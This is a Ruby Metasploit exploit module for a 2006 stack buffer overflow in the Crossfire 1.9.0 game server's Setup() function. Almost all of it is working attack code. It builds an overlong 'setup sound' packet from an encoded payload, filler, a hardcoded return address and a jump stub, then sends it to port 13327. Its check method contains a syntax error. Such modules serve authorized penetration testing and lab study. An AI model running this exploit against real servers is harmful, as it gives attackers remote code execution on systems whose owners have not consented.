##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Crossfire 1.9.0 Buffer Overflow',
      'Description'	=> %q{
	This module exploits a stack buffer overflow in the Setup() function of
	Crossfire 1.9.0. By sending an overly long string, the stack can be
	overwritten.
      },
      'Author'	=> [ 'Jeremy Reeder' ],
      'Arch'		=> ARCH_X86,
      'Platform'	=> 'linux',
      'References'	=>
        [
          [ 'CVE', '2006-1236' ],
          [ 'OSVDB', '2006-1236' ],
          [ 'EDB', '1582' ]
        ],
      'Privileged'	=> false,
      'License'	=> MSF_LICENSE,
      'Payload'	=>
        {
          'Space' => 1000,
          'BadChars' => "\x00\x20",
        },
      'Targets'	=>
        [
          [ 'Kali GNU/Linux (Debian 5.2.9-2kali1)', { 'Ret' => 0x08134596 } ],
        ],
      'DefaultTarget'	=> 0,
      'DisclosureDate'  => '2006-03-14'
    ))

    register_options(
      [
        Opt::RPORT(13327)
      ],
      self.class
    )
  end

  def check
    if (banner =~ /version 1023 1027 Crossfire Server/)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit:CheckCode::Safe
  end

  def exploit
    stage1 = "\x83\xc0\x0c\xff\xe0\x90\x90" # ADD EAX,12; JMP EAX; NOP; NOP
    stage2 = payload.encoded
    garbage = rand_text_alpha_upper(4368 - payload.encoded.length)

    sploit = "\x11(setup sound "
    sploit << stage2
    sploit << garbage
    sploit << [target.ret].pack('V')
    sploit << stage1
    sploit << "\x90\x00#"

    connect
    sock.put(sploit)
    handler
    disconnect

  end
end
